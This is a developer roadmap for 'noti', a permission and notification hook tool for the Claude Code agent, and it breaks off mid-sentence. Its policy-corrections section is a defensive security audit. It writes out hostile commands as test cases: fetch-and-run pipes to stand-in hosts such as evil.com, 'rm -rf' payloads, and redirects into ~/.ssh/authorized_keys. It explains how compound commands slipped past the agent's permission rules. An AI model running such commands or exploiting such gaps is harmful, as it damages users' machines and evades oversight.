# DEV.md — the roadmap

This file is the forward-looking spec: which Claude Code hook events noti
adopts, skips, or still owes a decision, the corrections it owes its own policy
engine, and the feature backlog behind them. It exists so that growth is as
deliberate as the current code — and, where upstream has moved under us, so
that the retreat is as deliberate as the growth. How to *change*
the code lives in [CONTRIBUTING.md](CONTRIBUTING.md); agent guidance lives in
[CLAUDE.md](CLAUDE.md) — if a sentence would fit in either of those, it does
not belong here. Nothing ships that isn't on this roadmap or trivially in its
spirit.

## The charter test

noti surfaces **only the moments a human is actually needed** and stays silent
otherwise. Every candidate feature is judged by one question: *does this
summon a human who is required, or does it narrate work that is going fine?*
Narration fails the test, always.
One opt-in ambient surface may exist so the summons has somewhere to stand;
everything it shows outside the summons stays inert — no counts, no progress,
no lists.

Explicit non-goals, so they don't creep back in:

- **Session dashboards and multi-agent orchestration** — herdr's job.
- **Session logistics and context plumbing** (compaction, prompt injection,
  worktrees) — ccbaton's lane.
- **Narrating success** — the terminal already shows what Claude did.

## The auto-mode reckoning (2026-09-09)

The charter above is unchanged. What changed is the world it runs in — and one
sentence of the code now contradicts the docs it was written against.

`evaluate()` step 3 says of auto mode: *"auto mode falls through: noti's toast
simply replaces the prompt the classifier would have shown."* **That premise is
false.** PreToolUse fires *before* the permission classifier, so in auto mode
there is no prompt to replace — noti manufactures one. Auto mode is also now
the built-in starting permission mode on Pro, Max, and Team plans, so this is
the majority path, not an edge case.

### The measurement

165 governed tool calls, replayed from seven real transcripts through
`evaluate()` with `permission_mode: "auto"`:

| noti verdict | count | share |
|---|---|---|
| prompt (a blocking toast) | 85 | 51.5% |
| allow | 77 | 46.7% |
| question | 3 | 1.8% |

Those 85 toasts, sorted by what auto mode would have done instead:

| What auto mode actually does | count | share of toasts |
|---|---|---|
| Bash → classifier review | 38 | 44.2% |
| Edit inside the working dir → **auto-approved, classifier never called** | 38 | 44.2% |
| Edit outside the working dir → may prompt | 6 | 7.0% |
| bare `cd` into a dir → treated as read-only | 4 | 4.7% |

**Half of every toast noti fires in auto mode is for an action auto mode
approves without so much as a classifier call.** In default mode noti was
friction-neutral — the same number of decisions, on a better surface. In auto
mode it is friction-*additive*: a blocking modal in front of 38 of 47 file
edits.

### The inversion

The other half fails differently. noti's `allow` is a `permissionDecision`,
which short-circuits the permission flow — so noti does not merely *precede*
the classifier, it *replaces* it. What it substitutes: a 14-entry static
prefix safe-list, and a human reading 220 truncated characters in a screen
corner. What it displaces: a Sonnet-5 classifier that reads the transcript,
CLAUDE.md, trusted-infrastructure config, boundaries stated in conversation,
protected and critical paths, and a `git status` probe before any command that
would discard uncommitted work.

noti was built when it was the only thing between Claude and the machine
besides a y/n prompt. It no longer is. A toast that interposes on a
better-informed decider is not a summons — it is narration with a button, and
the charter test rejects it.

### What noti is for now

Unchanged in one sentence: **surface only the moments a human is actually
needed.** Auto mode did not delete those moments, it moved them. It absorbed
the routine ones (which noti still fires on) and created new ones (which noti
is silent about — see the `PermissionDenied` row).

The strategic call, which the rest of this file now assumes: **the PreToolUse
permission UI is a Manual-mode feature.** Keep it correct, keep it good, stop
treating it as the product. The product is the away-from-keyboard surface for
the moments auto mode escalates.

## Policy corrections

Six defects against Claude Code 2.1.266 — five found 2026-09-09, and C6 found
while fixing C2. C1 is the reckoning above reduced to a code change. C2–C6 are
matcher drift: noti's rule engine and Claude's have diverged, and in four of
them noti is *broader* than Claude — the one direction CLAUDE.md names as never
safe. C2 and C3 were live in any install with a prefix rule, in every
permission mode, and were not covered by `test.sh`.

Ship order follows the tags, not the numbering: C2/C3 first (exploitable
today, in every permission mode), then C1 (the clunk), then C4, then C5. Each lands with the regression tests named below; per
CONTRIBUTING these encode fixed vulnerabilities and never get weakened later.

**Status: C2 and C3 shipped 2026-09-09** (`_bash_allow_parts` /
`_bash_deny_parts` / `_bash_rule_hit`, 30 new regression assertions). C6 was found
while fixing them and is not yet scheduled. C1, C4, C5 remain open.

### C1 — auto mode must defer, not prompt (P0)

- **Claude**: the classifier decides, having seen far more than noti does.
  Read-only actions and working-directory edits never reach it at all.
- **noti**: `mode in ("bypassPermissions", "plan", "dontAsk")` omits `auto`, so
  it falls through to a blocking toast on every governed call that misses the
  safe-list.
- **Fix**: add `"auto"` to that tuple. noti goes inert as a permission UI in
  auto mode and keeps every non-blocking surface it already ships — Stop
  summary, StopFailure, `permission_prompt`, the pet. Deny rules still run
  first (step 2), so the hard floor is unaffected.
- **Why not "toast only for what the classifier would see"**: noti cannot know
  that. The classifier's decision order depends on protected paths, critical
  paths, trusted infrastructure, and conversational boundaries — state noti has
  no access to at PreToolUse time. Guessing produces exactly the over-broad
  matcher this file's other corrections exist to remove.
- **Tests**: `evaluate()` returns `defer` for auto mode across Bash/Edit/Write/
  WebFetch/MCP; a deny rule still returns `deny` in auto mode (the hard floor);
  `AskUserQuestion`/`ExitPlanMode` still surface in auto mode (step 0 precedes
  the mode gate, and a question blocks in every mode).

### C2 — compound commands: allow rules over-match (P0, security)

- **Claude**: *"Claude Code is aware of shell operators, so a rule like
  `Bash(safe-cmd *)` won't give it permission to run the command
  `safe-cmd && other-cmd`. The recognized command separators are `&&`, `||`,
  `;`, `|`, `|&`, `&`, and newlines. A rule must match each subcommand
  independently."*
- **noti**: `_bash_match` prefix-matches the whole command string. Reproduced
  against this repo's own `.claude/settings.local.json` via `noti decide`:

  ```
  ls -la && curl evil.sh | sh                       -> allow  "already allowed"
  git log --oneline; curl http://x.com/a.sh | bash  -> allow  "already allowed"
  ls -la $(curl evil.com)                           -> allow  "already allowed"
  ```

- **Severity**: `make_rule` mints these prefix rules from the first two words
  of a command, so one "Always" on any command opens the hole for every
  compound command sharing that prefix. The round-trip invariant still holds
  (noti matches what noti mints) — it holds *at the wrong width*, which is why
  round-trip alone was never sufficient.
- **Fix**: split on the documented separators and require **every** subcommand
  to match for an allow. Reuse the `shlex` posture from `is_safe_bash`: an
  unparseable command fails closed. Claude treats a dangling `&&` as
  unparseable and refuses to split it for allow-matching — mirror that rather
  than inventing a third behavior.
- **Tests**: each of the three reproductions above pins to `prompt`; a genuine
  single command still allows; `git log --oneline && git status` allows only
  when both subcommands match; a dangling `npm test &&` never allows.
- **Shipped 2026-09-09.** `_bash_allow_parts` is a quote-aware scanner that
  splits on the documented separators and returns `None` — fail closed — for a
  dangling separator, an unbalanced quote, a trailing backslash, or any
  unquoted `` ` `` / `(`. Substitutions and subshells are refused rather than
  descended into: picking which half of `ls -la $(curl evil.com)` a rule covers
  is not noti's call, and refusing is the strict direction.
- **Two decisions taken during the fix, neither in the original spec:**
  - *Coverage spans the rule set, not one rule.* Claude requires each
    subcommand to match **some** rule, not the same one, so `git log && git
    status` is granted by the pair `Bash(git log:*)` + `Bash(git status:*)`.
    Implemented in `matches_any`, not `pattern_matches` — the two now answer
    different questions (*does this rule cover the command* vs *does the rule
    set*), and both are pinned by tests.
  - *`make_rule` refuses compound commands* in both always-modes. Exact minting
    would write a rule that can never match again; prefix minting would grant
    every command sharing the head. Refusing is what keeps the mint/match
    round-trip true now that the matcher splits — "Always" degrades to a
    one-time "Yes", and the prompt flow already hides the button off that
    `None`.
- **Measured cost**: over 130 unique Bash calls from real transcripts, calls
  auto-allowed by a rule fell 48 → 20. All 28 are genuine compound commands
  with a subcommand no rule covers (`echo`, `head`, `wc`, `git tag`). These are
  not new toasts so much as restored ones: Claude would have prompted for every
  one, and noti was suppressing it. C1 makes the point moot in auto mode.

### C3 — compound commands: deny and ask rules under-match (P0, security)

- **Claude**: *"Deny and ask rules apply when any subcommand matches them,
  including a command nested inside a subshell, a command substitution, or a
  control-flow body such as a `for` loop."*
- **noti**: the `broad=True` deny path is still a whole-string `startswith`, so
  a `Bash(rm *)` deny does not match `ls && rm -rf ~`.
- **Severity**: the mirror image of C2, and they compose — the same command can
  slip the deny *and* land the allow. This is the failure the `broad` flag was
  introduced to prevent; it was simply never extended past the bare-`*` case.
- **Fix**: match any subcommand, and descend into `$()`, backticks, subshells,
  and control-flow bodies. Over-denying stays the safe direction, so when the
  parse is uncertain, deny.
- **Tests**: `Bash(rm *)` denies `ls && rm -rf ~`, `echo $(rm -rf /)`, and a
  `for` loop body containing `rm`; the existing bare-`*` deny cases still pass.
- **Shipped 2026-09-09.** `_bash_deny_parts` splits crudely and deliberately
  *ignores quoting*, then peels control-flow keywords and a leading `VAR=` off
  each fragment. Crude can only ever yield more candidates than a real parse,
  and the raw command is always included in the list, so this is provably never
  narrower than the whole-string matcher it replaces. It over-denies on a
  denied verb inside a quoted string (`echo "; rm -rf /"`) — the safe direction,
  and the reason the deny path is not simply the allow scanner run backwards.

### C6 — redirection turns a read-only allow rule into a write (P1, security)

Found 2026-09-09 while fixing C2; **not** covered by the C2/C3 fix, which
splits on command separators only.

- **noti**: `>` and `>>` are not separators, so the whole string stays one
  subcommand and matches on its verb. Confirmed against a rule set of exactly
  one rule:

  ```
  ls -la > ~/.zshrc                      vs Bash(ls -la:*)   -> allow
  git log --oneline >> ~/.ssh/authorized_keys vs Bash(git log:*) -> allow
  ```

- **Severity**: an allow rule for a read-only verb grants an arbitrary file
  write. Narrower than C2 — it needs a user-authored allow rule on the verb,
  and the safe-list path is already immune (`_BASH_META` covers `<` and `>`, so
  `bash_safe_commands` never sees a redirect). But the shape is the one CLAUDE.md
  calls never safe: noti broader than the verb the user approved.
- **Open question before fixing**: whether Claude's own matcher treats a
  redirect as part of the subcommand. If it does, fixing this makes noti
  stricter than Claude — allowed, but it costs toasts on `cmd > /tmp/out`, which
  is common. Verify against the live engine before choosing.
- **Fix (proposed)**: treat an unquoted `>`, `>>`, `<`, `<>`, or `N>` as ending
  the subcommand for allow matching, so the redirect target is a part no rule
  covers and the call falls through to a toast. Deny matching needs no change.
- **Tests**: `ls -la > ~/.zshrc` does not allow under `Bash(ls -la:*)`; a
  quoted `echo "a > b"` still allows; deny behavior is unchanged.

### C4 — `permissions.ask` is invisible to noti (P1, security)

- **Claude**: ask rules force a permission prompt *even in auto mode*, and
  outrank allow rules.
- **noti**: `load_patterns` reads only `allow` and `deny`. An ask rule is not
  merely ignored — it loses to noti's safe-list, so a call the user explicitly
  marked "always ask me" auto-allows silently. An ask rule on `Bash(grep *)`
  is defeated by the `grep` entry in `bash_safe_commands`.
- **Fix**: load `ask` as a third pattern kind, matched with `_bash_deny_parts`
  (C3's any-subcommand semantics, shipped and ready to reuse), checked after deny and before every allow path *and* before the
  safe-list. An ask match forces the toast; it must never auto-allow.
- **Tests**: an ask rule beats the safe-list, beats an allow rule, and loses to
  a deny rule — the full precedence ladder pinned in one case each.

### C5 — noti honors allow rules that auto mode deliberately drops (P2)

- **Claude**: *"On entering auto mode, broad allow rules that grant arbitrary
  code execution are dropped"* — blanket `Bash(*)`/`PowerShell(*)`, wildcarded
  interpreters like `Bash(python*)`, package-manager run commands, `Agent`
  rules, and `Monitor` rules. They are restored on leaving auto mode.
- **noti**: reads the settings files directly and honors every allow rule in
  every mode, so it can allow via a rule Claude has disarmed for that session.
- **Severity**: subsumed by C1 for auto mode (deferring never consults allow
  rules), so this is defence-in-depth rather than an independent P0 — but it is
  the rule that keeps noti honest if the C1 gate is ever narrowed.
- **Fix**: drop the same rule shapes from `load_patterns("allow")` when
  `permission_mode == "auto"`. Deny and ask rules are never dropped.
- **Tests**: `Bash(python*)` allows in default mode and does not in auto mode;
  a narrow `Bash(npm test)` survives in both.

## Hook event inventory

Claude Code exposes ~30 hook events (snapshot of
[code.claude.com/docs/en/hooks](https://code.claude.com/docs/en/hooks.md),
**re-verified 2026-09-09** against Claude Code 2.1.266 — re-verify again
before acting on a row). noti registers six: PreToolUse, Stop, StopFailure,
Notification, UserPromptSubmit, SessionEnd. Consistency does not mean hooking
more events; it means **every event has a verdict**, so a skip is a decision
with a reason, not an omission.

Verdicts: `shipped` · `adopt-P1` · `adopt-P2` · `investigate` · `skip`.

| Event (matcher) | Verdict | Why |
|---|---|---|
| PreToolUse | shipped | The core: approval/question/plan toasts. The only handler that may ever emit a decision (R1). Fires **before** the permission classifier, which is why C1 makes auto mode a defer — see [the reckoning](#the-auto-mode-reckoning-2026-09-09). |
| Stop | shipped | End-of-turn summary + tally. Inert by design — never blocks (R2). |
| Notification / `permission_prompt` | **shipped 2026-07-16** | The flagship gap, closed: when noti falls back (toast timeout, Esc, ungoverned tool) a notify-only `note` toast says a permission prompt is waiting. Deliberate hand-offs (Esc, plan View, complex-set notice) dedup via a 10s `.deferred` marker beside the tally — Esc vs timeout told apart by elapsed time, since the binary exits 124 for both. Also stands the pet's `waiting` summons, which covers ungoverned tools. Kill-switch `alerts.terminal_prompt`. |
| StopFailure (all reasons) | **shipped 2026-07-08** | Turn died on rate-limit/auth/server error; the user waits for a summary toast that never comes. Red `error` toast with reason copy + the dead turn's tally as footer; also stands the pet's `failed` summons. Kill-switch `alerts.stop_failure`. Existing installs need `noti uninstall && noti install` to register the new event. |
| PostToolUseFailure | **adopt-P2** | Silent tally-only, so the summary can say "· 1 failed" — the difference between "done" and "done, but look". Never a per-failure toast (spam). |
| Elicitation / ElicitationResult | investigate | An MCP server blocking the session on user input is AskUserQuestion's class, but the contract needs a spike first. |
| Notification / `elicitation_*` | investigate | Folded into the Elicitation spike — same question. Concrete subtypes confirmed 2026-09-09: `elicitation_dialog`, `elicitation_url_dialog`, `elicitation_complete`, `elicitation_response`. The first two are the candidate summons; the latter two are completion narration and would skip on their own. |
| Notification / `agent_needs_input`, `agent_completed` | investigate | A background agent blocked on a human is in-charter (v2.1.198+), but spike whether any terminal UI accompanies it before designing copy. |
| SessionStart | investigate | Housekeeping-only candidate (sweep stale tally/slot files at startup). Its stdout becomes model context, so the handler must print nothing (R4). Never a toast. |
| Notification / `idle_prompt` | skip | The Stop summary already announces end-of-turn; a user who set `summary.enabled: false` chose silence — don't reintroduce the nag through a side door. |
| Notification / `auth_success` | skip | Not a human-in-the-loop moment; the terminal shows it. |
| Notification / `quota_auto_resume_stale` | **adopt-P2** | New since the 2026-07 snapshot. The session queued itself to resume when quota reset and the resume went stale — so work the user believes is queued is not going to happen. A human is needed and nothing else tells them. Rides `hook_stopfailure`'s copy-map posture and its `error` kind. |
| Notification / `quota_auto_resume_fired` | skip | The resume worked; the turn will end in a Stop summary like any other. Narration. |
| Notification / `quota_auto_resume_disabled` | skip | A state change the user made, not a summons. |
| PermissionRequest | skip | Two deciders in one chain is answer-integrity confusion — noti already decided upstream at PreToolUse. Re-checked 2026-09-09: its auto-mode behavior is still undocumented, and exit 2 is not honored (deny goes through a `decision` object), so adopting it would mean a second decider on an unspecified contract. Revisit only if `updatedPermissions`/`setMode` becomes the sole way to mint rules Claude honors natively. |
| PermissionDenied | **adopt-P1** | Verdict flipped 2026-09-09. The 2026-07 skip assumed a deny the user had just issued — but this event now fires **when auto mode denies a tool call**, i.e. when the classifier blocked something the human never saw. Claude retries an alternative and works around it silently; the human learns nothing until they read scrollback. That is the charter, exactly. Notify-only: noti must never send `hookSpecificOutput.retry` (R1). Design below. |
| SubagentStop | skip | Subagent completion is orchestration narration (herdr), and the event is blocking-capable — adopting it would tempt a second decider (R1/R2). |
| SubagentStart | skip | Pure narration. |
| SessionEnd | **shipped 2026-07-16** | Never a toast (telling the user they ended a session is noise) — but the pet must know: a session closed mid-prompt left a zombie summons standing until the waiting TTL. The handler silently reaps that session's pet state file, nothing else. |
| PostToolUse | skip | Success narration; the tally already counts intent at PreToolUse time. |
| PostToolBatch | skip | Batch narration — same reasoning as PostToolUse. |
| PreCompact / PostCompact | skip | Context logistics — ccbaton's lane. |
| UserPromptSubmit / UserPromptExpansion | **shipped 2026-07-16** (Submit only) | "The human just acted, so they are present by definition" — originally the reason to skip, actually the exact signal that clears a standing summons: answering a terminal prompt fires no hook of its own, so a summons survived an Esc'd turn or a long approved tool. The handler writes `running` for that session and prints nothing (stdout becomes model context — R4 is why it stays silent, not why it stays away). UserPromptExpansion remains skipped. |
| TeammateIdle | skip | Multi-agent orchestration — herdr's job. |
| TaskCreated / TaskCompleted | skip | Task-list narration is dashboard territory, explicitly out of charter. |
| FileChanged | skip | File watching is not approval; PreToolUse already governs the edits Claude makes. |
| CwdChanged | skip | Session logistics; nothing to decide. |
| WorktreeCreate / WorktreeRemove | skip | Workspace plumbing; nothing human-blocking. |
| ConfigChange | skip | Tempting security signal, but an in-session edit to settings files already routes through an Edit approval toast, and noti re-reads rules per decision — no cache to invalidate. External edits are the user's own. |
| InstructionsLoaded | skip | Context plumbing. |
| MessageDisplay | skip | Would duplicate terminal output — the maximal anti-charter event. |
| Setup | skip | The user is at the keyboard running it. |

## Adopted designs

### Notification / `permission_prompt` — "Claude needs you in the terminal" (P1)

- Register a `Notification` block, matcher `permission_prompt`, command
  `noti hook notification`, no timeout. New branch in `cmd_hook` (noti:1169),
  same fail-open wrapper as the others.
- Non-blocking summary-style toast: title = project basename (the `hook_stop`
  derivation), body "Claude needs you in the terminal — a permission prompt
  is waiting", kind `note` (terracotta is the reserved "Claude wants me"
  signal — this IS that moment).
- **Dedup (R5):** three ways to arrive here. Ungoverned tool → noti never
  toasted, always show. noti toast timed out → the user was away; this is the
  reminder that matters, show. User pressed **Esc** → they deliberately sent
  the prompt to the terminal seconds ago, suppress. Mechanism: `hook_pretooluse`
  drops a best-effort marker file beside the tally (`<sid>.deferred`, reason +
  timestamp); the notification handler suppresses only `esc` within ~10s. A
  missing or unreadable marker degrades to *show* — fail-open here means
  fail-toast, never fail-silent.
- Kill-switch: new `alerts.terminal_prompt` config key (install writes the
  block only when true).
- Open question: does `permission_prompt` also fire for question/plan terminal
  fallbacks? Keep the copy generic so it's correct either way.

Shipped 2026-07-16 as designed, with two build-time findings: (a) the toast
binary exits 124 for BOTH Esc and timeout, so the Esc marker is written when
the toast returned materially faster than its budget (elapsed < timeout−2s) —
no Swift change needed; (b) question/plan fallbacks mark too (plan **View**
and an empty free-text submit count as deliberate hand-offs, the complex-set
notice marks `notice`), so the copy stays correct whether or not the event
fires for them. The handler also stands the pet's `waiting` summons — that is
what extends the standing summons (and click-to-focus, captured at
notification time) to ungoverned tools.

### StopFailure — the turn died (P1)

- Register `StopFailure`, no matcher (all reasons), `noti hook stopfailure`,
  no timeout.
- Toast body from a reason→copy map (`rate_limit` → "Turn ended: rate
  limited", likewise `overloaded`, `authentication_failed`, `billing_error`,
  `server_error`, `max_output_tokens`); an unknown reason renders verbatim —
  never guessed at.
- New Swift kind `error`: `.systemRed` chip, `exclamationmark.triangle.fill`
  glyph — two cases in `kindColor`/`kindGlyph` (noti-toast.swift:214/227).
  Red is warranted: this is the one toast whose message is "something broke",
  and borrowing `note`'s terracotta would dilute the identity color.
- **Also read-and-clear the tally** and render it as the footer ("after ran 3
  commands · edited 1 file"). Otherwise the dead turn's tally leaks into the
  next turn's summary or rots until the 48h sweep — the subtle correctness
  win of this hook.
- Kill-switch: `alerts.stop_failure`. Falls out for free: `--kind error` for
  the reusable `noti notify` CLI.

### PostToolUseFailure — failure tally, no toast (P2)

- Register `PostToolUseFailure`, no matcher, `noti hook posttoolusefailure`.
- Handler is a `tally_record_failure()` sibling of `tally_record` (noti:775)
  incrementing a `failed` count; `format_tally` (noti:826) learns "· N
  failed". **No toast ever fires from this handler.**
- Count all tools, not just governed ones — a failed ungoverned tool still
  explains a confusing final message.
- Config: `summary.show_failures` as the rendering knob; the count is always
  recorded (cheap, and the StopFailure footer can use it).

### PermissionDenied — the classifier blocked something you never saw (P1)

The flagship gap of the auto-mode era, and the reason this event's 2026-07
skip was wrong. In auto mode a classifier block is *silent by construction*:
Claude receives the reason (usually the fixed text `Blocked by classifier`),
tries an alternative, and keeps working. The action lands in `/permissions` ›
**Recently denied**, where `r` retries it with a manual approval — a surface
nobody opens unattended. A human is needed to decide whether the block was
right, and today nothing summons them.

- Register `PermissionDenied`, no matcher (all tools), `noti hook
  permissiondenied`, no timeout. New branch in `cmd_hook`, same fail-open
  wrapper.
- **Notify-only, always.** The event accepts `hookSpecificOutput.retry: true`
  to tell the model it may retry. noti must never send it: R1 gives exactly one
  handler a decision, and retry-on-deny is policy, not notification — the
  original skip was right about *that* half and it survives the flip.
- Non-blocking `note` toast: title = project basename, body "Claude Code
  blocked an action — /permissions › Recently denied, press r to retry",
  footer = the tool and a truncated `render_call` message so the user knows
  *what* was blocked without opening the terminal. Terracotta, not red: this
  is "Claude wants me", not "something broke".
- **Coalesce (P0 within this design).** The classifier blocks up to 3 times
  consecutively before auto mode pauses, and Claude retries alternatives in
  between — so the naive handler fires a toast per block. One toast per
  session per cooldown window (`alerts.denied_cooldown_seconds`, default 60);
  subsequent blocks inside the window update nothing and show nothing. Without
  this the feature is a spam generator and fails the charter on its own terms.
- **Dedup (R5).** Repeated blocks pause auto mode and Claude Code resumes
  prompting, which fires `Notification / permission_prompt` seconds later —
  the same human moment, arriving twice. Reuse the reference implementation:
  the handler drops a `denied` marker beside the tally, and `hook_notification`
  suppresses on it within the existing ~10s window. A missing or unreadable
  marker degrades to *show* (fail-toast, never fail-silent), so the copy above
  carries the actionable instruction on its own and is correct standing alone.
- **Subagents.** This is a tool event, so it fires inside subagents carrying
  `agent_id`. A subagent blocked by the classifier is genuinely human-needed,
  but N parallel agents are N toasts — the cooldown is per session, not per
  agent, precisely so a fan-out cannot multiply it.
- **No verdict is invisible.** When the classifier produces no verdict, Claude
  Code denies *without* the notification or the Recently-denied entry. The hook
  still fires ("including denials without a classifier verdict"), so noti is
  the only surface that can report it — spike whether the payload distinguishes
  the two cases before writing copy that claims which happened.
- Kill-switch: `alerts.permission_denied`.

## Under investigation

Each item is gated by one question a spike must answer first (the
`docs/spikes/` pattern: evidence before design).

- **Elicitation / ElicitationResult** — does the session hard-block, and is
  there a documented response channel, or is it dialog-only? Likely v1 is a
  heads-up notify toast ("Server X needs input in the terminal"), the same
  posture as multi-select questions. Toast-*answering* only if the contract
  is documented upstream, and then only behind a kill-switch (R7).
- **Notification / `agent_needs_input` / `agent_completed`** — do background-
  agent prompts show any terminal UI at all? If a blocked background agent is
  truly invisible today, this graduates to P1: it is `permission_prompt`'s
  rationale one step removed. `agent_completed` likely stays skip (narration).
- **Subagent tool calls** — PreToolUse fires inside subagents with `agent_id`
  and `agent_type` set; noti reads neither. 25 of the 165 calls measured for
  the reckoning were subagent calls. Two questions before designing: does a
  human watching a fan-out want N stacked blocking toasts for work they are not
  reading, and do concurrent subagents share a `session_id` (if so they
  currently overwrite each other's pet state file, which is a bug regardless of
  the answer to the first). C1 defuses the toast half in auto mode; the pet
  state collision survives it.
- **Auto mode paused** — after 3 consecutive or 20 total classifier blocks,
  auto mode pauses and the session silently reverts to prompting. Confirmed
  2026-09-09: **no hook event or notification is documented for the pause
  itself.** It is partially covered already — the next prompt fires
  `Notification / permission_prompt`, which noti ships — so the user is
  summoned, just not told why. Adopt nothing until upstream exposes the
  transition; the spike question is whether the pause is inferable from the
  `PermissionDenied` stream without guessing.
- **SessionStart housekeeping** — adopt only if stale tally/slot files show
  up in practice; the existing 48h sweep (noti:807) may be enough, and a
  third hook on every session start is not free. If adopted: matcher
  `startup`, sweep, exit — stdout stays empty (R4).

## What adopting a hook means

An adoption PR that skips a step is incomplete by definition:

1. **Charter test** — name the human-in-the-loop moment in one sentence. If
   it narrates instead of summons, stop here.
2. **Verdict flip** — update this file's table row, in the same PR.
3. **Handler** — new branch in `cmd_hook` (noti:1169), wrapped in the same
   fail-open try/except: exit 0 and no output on any internal error.
4. **Decision audit** — the handler emits no decision JSON and no stdout
   unless it is `pretooluse` (R1, R4).
5. **Install** — `cmd_install` (noti:1264) writes the block: matcher from
   config where applicable; notify-only handlers get no timeout, deciding
   handlers get `ask_timeout + 30`; merge, never clobber (herdr and ccbaton
   share the settings file).
6. **Uninstall + doctor** — add the event to the uninstall sweep tuple
   (noti:1333) and to doctor's presence/staleness checks (the matcher-currency
   check at noti:1430 is the pattern).
7. **Config** — a kill-switch key in `DEFAULT_CONFIG` (noti:66) with a
   why-comment, plus the README config-table row.
8. **Tests** — test.sh cases: garbage stdin exits 0; the behavior mapping
   (copy / tally / dedup); a regression pinning the dedup rule if any toast
   can co-fire with an existing one.
9. **Surface** — a new toast kind means `kindColor` + `kindGlyph` cases, the
   README kind list, `./noti build`, and preview-toasts snapshots in both
   palettes. CHANGELOG entry last.

## Roadmap invariants

These layer on CONTRIBUTING.md's invariants, which govern the existing code;
these govern growth.

- **R1 — One decider.** Only `hook_pretooluse` may ever emit a decision.
  Every other handler is structurally notify-only — no decision JSON, ever,
  even where the event supports one.
- **R2 — Stop-family events are inert.** noti never blocks from Stop or
  SubagentStop. The `stop_hook_active` anti-loop flag exists because blocking
  Stop hooks can spiral; today's handler is inert and stays that way.
- **R3 — One keyboard-capturing surface.** Only ask-mode toasts arm hotkeys.
  New toasts are non-capturing notify cards unless they go through the full
  hover-armed safety review — keystroke-capture safety is the sacred property.
- **R4 — No stdout on context-injecting events.** Anything printed from
  SessionStart/UserPromptSubmit-class hooks becomes model context; handlers
  on such events write only to the debug log.
- **R5 — At most one toast per human moment.** Any new toast must state which
  existing toast can co-fire and how the duplicate is suppressed (the
  `permission_prompt` marker is the reference implementation).
- **R6 — Every event has a verdict.** A hook event with no row in the
  inventory above is a bug in this document. `doctor` should warn when the
  installed event set drifts from the shipped set (backlog item below).
- **R7 — Observed-behavior features get kill-switches.** Anything built on
  undocumented upstream behavior ships with a config key that fully disables
  it without a code change (precedent: `approval.question_other`).
- **R8 — Never out-vote a better-informed decider.** noti may narrow what
  Claude would allow; it may never widen it, and it may never substitute its
  own judgment for a decider that sees more than noti does. In default mode an
  `allow` displaces a y/n prompt backed by no more information than noti has —
  parity, and the whole point. In auto mode the same `allow` displaces a model
  reading the transcript, CLAUDE.md, and the trust boundary — a downgrade
  dressed as a convenience. The safe-list exists to skip *noti's* toast, never
  *Claude's* review. Every future mode gets this question asked before noti
  emits a decision in it.

## Non-hook backlog

| Priority | Item | Notes |
|---|---|---|
| shipped 2026-07-06 | Junk-proof "Always" rules | `make_rule` refuses multiline and >200-char commands — an exact rule for a heredoc can never match a future call, so the "grant" was pure clutter (observed: 150+ multiline entries across real settings files, one 7.7KB). The approval toast hides the Always button whenever minting would refuse, so the button never silently downgrades to a one-time Yes. |
| P1 | Other-editor countdown pause | While the free-text editor is open, pause or extend the deadline drain (≤15s grace). Timing out mid-sentence is the accidental-loss class noti exists to prevent. Swift-side; interacts with the all-or-nothing question-set deadline. |
| P1 | `noti ask --other` CLI flag | Expose the free-text row to the reusable primitive — the exit-10 / RC_OTHER contract already exists. One README line under "Reusable primitives". |
| P2 | Denials in the tally | `tally_record` learns a `denied` count (recorded at decision time in `hook_pretooluse`); summary reads "· denied 1". Pairs with PostToolUseFailure's `failed`. |
| P1 | Install with an `if` filter | Hook config now supports `if` (permission-rule syntax, tool events only): `"if": "Bash(git *)"` and the hook only runs when the call matches. Today `cmd_install` writes a broad `matcher` regex and noti spawns a Python process for every governed call just to defer on most of them. Moving the coarse filter upstream cuts process spawns and makes the deferred cases free. Note the documented asymmetry: `if` descends into `$()`/backticks and runs the hook on `$VAR` command names it cannot resolve — it fails *open* toward running, so it can narrow work but must never be relied on as a security boundary. |
| P1 | Gate on `agent_id` | Skip the toast for subagent tool calls (config: `approval.govern_subagents`, default off once C1 lands). Pairs with the subagent investigate item; the pet-state collision is the separate half. |
| P2 | Doctor: auto-mode posture | `doctor` reports the session-independent facts a user needs after C1: whether `permissions.defaultMode` is `auto`, and that noti's permission UI is inert there. Prevents the "noti stopped working" bug report that C1 will otherwise generate. |
| P2 | Refresh stale `noti:NNN` references | The `noti:` line refs throughout this file predate several releases — `cmd_hook` is cited as noti:1169 but lives at 1701, `cmd_install` as noti:1264 but lives at 1804. Either re-stamp them or drop to symbol names, which do not rot. |
| P2 | Doctor: managed-settings warning | Promote the README known-limitation: if `/Library/Application Support/ClaudeCode/managed-settings.json` exists, warn that its deny rules are invisible to noti and suggest emptying `bash_safe_commands`. Read-only check, zero-dep. |
| P2 | Doctor: hook-coverage drift | Compare installed event set against this version's shipped set; "install predates `<event>` — `noti uninstall && noti install`". R6's enforcement arm. |
| P2 | Opt-in per-toast sound | Accessibility: `toast.sound` (default false). NSSound is AppKit — zero-dep holds. Distinct (or no) sound for summary vs ask, so ask stays salient. |
| shipped 2026-07-07 | The pet — a standing summons | Opt-in ambient companion: one non-capturing state-file reader, never a toast suppressor. |
| shipped 2026-07-07 | Prompts grow out of the pet (`pet.attach_prompts`) | The live ask/question/plan toast attaches to a running pet — wears its robot, occludes it, unfurls/retracts — so the prompt reads as the pet, not a corner toast beside it. Still the sole decider (R1) and keyboard surface (R3). |
| shipped 2026-07-08 | Summons duration + a real standing summons | The summons card shows how long it has stood (`noti · 4m`); `pet.waiting_ttl_seconds` (default 30 min, clamped ≥ ask_timeout+30) replaces the toast-lifetime bound that retracted the summons 30s after the toast died. |
| shipped 2026-07-08 | Click-to-focus on the standing summons | Spiked by Codex (`docs/spikes/spike-focus.sh`), then wired: hooks stamp TTY + terminal app via ppid walk on summons writes; a click focuses the Terminal.app tab by tty, activates the app as the floor, does nothing when uncaptured. `pet.focus_terminal` kill-switch. |
| P3 | Pet-anchored stacking of concurrent attached prompts | Today a 2nd simultaneous attached prompt overlaps the 1st at the pet (top-answerable first). Stack them downward from the robot using the slot machinery rooted at the anchor, so both are visible — the corner column's behavior, re-based on the pet. |
| shipped 2026-07-08 | Document `--kind error` | Fell out of StopFailure; README's reusable-primitives styling flags. |

## The pet — a standing summons (design)

Inspired by [Codex pets](https://developers.openai.com/codex/app/settings):
a small floating companion that reflects agent status — and whose
"waiting for your input" state is noti's entire reason to exist, rendered as
presence instead of an event. A toast is a knock: miss it (away from the desk,
other Space, other monitor) and nothing keeps asking. A pet holding up a
"you're needed" sign **is the standing form of the summons** — it answers
